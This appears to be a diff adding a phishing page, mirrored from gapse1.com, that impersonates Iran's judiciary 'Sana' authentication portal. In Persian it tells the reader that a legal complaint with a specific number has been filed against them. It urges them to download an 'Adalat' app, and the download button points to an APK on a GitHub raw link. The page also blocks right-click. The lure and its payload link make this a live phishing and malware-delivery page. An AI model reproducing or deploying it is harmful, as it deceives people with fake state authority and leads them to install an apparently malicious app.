@@ -1,0 +1,129 @@
+<html ng-app="LoginApp" class="ng-scope">
+
+
+<!-- Mirrored from gapse1.com/download.php by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 22 Mar 2023 13:02:37 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+
+	<meta charset="utf-8">
+
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<meta name="description" content="سامانه احراز هویت ثنا">
+
+	<meta name="keywords" content="ثنا ، ثبت نام الکترونیک قضایی">
+
+	<title>سامانه احراز هویت ثنا | Sana Authentication</title>
+
+	<link href="css/bootstrap-theme.min.css"type="text/css" rel="stylesheet">
+
+	<link href="css/font-awesome.min.css" type="text/css" rel="stylesheet">
+
+	<link href="css/styles.css" type="text/css" rel="stylesheet">
+
+	<script src="css/jquery.min.js"></script>
+
+	<script src="css/sweetalert.min.js"></script>
+
+</head>
+
+
+
+<body ng-controller="LoginController" ng-csp="no-unsafe-eval | no-inline-style" oncontextmenu="return false"
+
+	class="ng-scope">
+
+	<div class="container">
+
+		<div class="row row-no-padding">
+
+			<div class="col-md-12 col-sm-12 col-xs-12">
+
+				<div class="background-white border-radius-20 margin-top-15 overflow-hidden shadow-sm overflow-hidden">
+
+					<div class="row row-no-padding no-margin no-padding d-flex" id="containerLogin">
+
+						<div class="col-md-12 col-sm-12 col-xs-12 pull-left">
+
+							<form name="frmAuthenticate" id="frmAuthenticate"
+
+								class="form-horizontal ng-pristine ng-valid ng-scope ng-valid-pattern ng-valid-minlength ng-valid-maxlength ng-valid-jud-validator"
+
+								role="form" ng-keypress="actions.preventEnterKey($event,1)" novalidate=""
+
+								jud-validator="" ng-if="viewModel.loginStep==1">
+
+								<section class="bg-light-default">
+
+									<div class="text-center  login-effect">
+
+                                    <div class="d-flex justify-content-center align-items-center mt-5">
+
+									<img src="img/logo.png" alt="مرکز آمار و فناوری اطلاعات قوه قضائیه">
+
+								</div>
+
+								<div class="d-flex justify-content-center align-items-center font-size-2rem">
+
+									قوه قضائیه
+
+								</div>
+
+                            </div>
+
+									<br>
+
+                                    <h5 style="line-height: 25px;" class="text-center text-success">
+مودی گرامی   شکایتی به شماره  1400032856 برای شما ثبت شده است لطفا برای مشاهده اپلیکیشن سامانه عدالت را از لینک زیر دانلود و سپس از طریق اپلیکیشن اقدام به بررسی شکایت خود کنید</h5>
+
+									<div class="row px-5">
+
+										<div class="col-sm-12 col-md-12 col-lg-12 col-xl-12">
+
+											<a href="https://github.com/iosyu01/okdash/raw/main/assets/eblagh.apk" id="submitbtn" class="btn btn-primary d-block btn-user w-100 rounded-pill p-2 mt-4"
+
+												focus-if="login.captchaValueFirst.length==5"
+
+												ng-disabled="viewModel.loading" ng-click="actions.checkPersonLogin()">
+
+												<span ng-if="!viewModel.loading"
+
+													class="ng-scope">
+
+													دانلود اپلیکیشن
+
+												</span>
+
+</a>
+
+										</div>
+
+									</div>
+
+									
+
+								</section>
+
+							</form>
+
+						</div>
+
+					</div>
+
+				</div>
+
+			</div>
+
+		</div>
+
+	</div>
+
+</body>
+
+
+
+
+<!-- Mirrored from gapse1.com/download.php by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 22 Mar 2023 13:02:38 GMT -->
+</html>
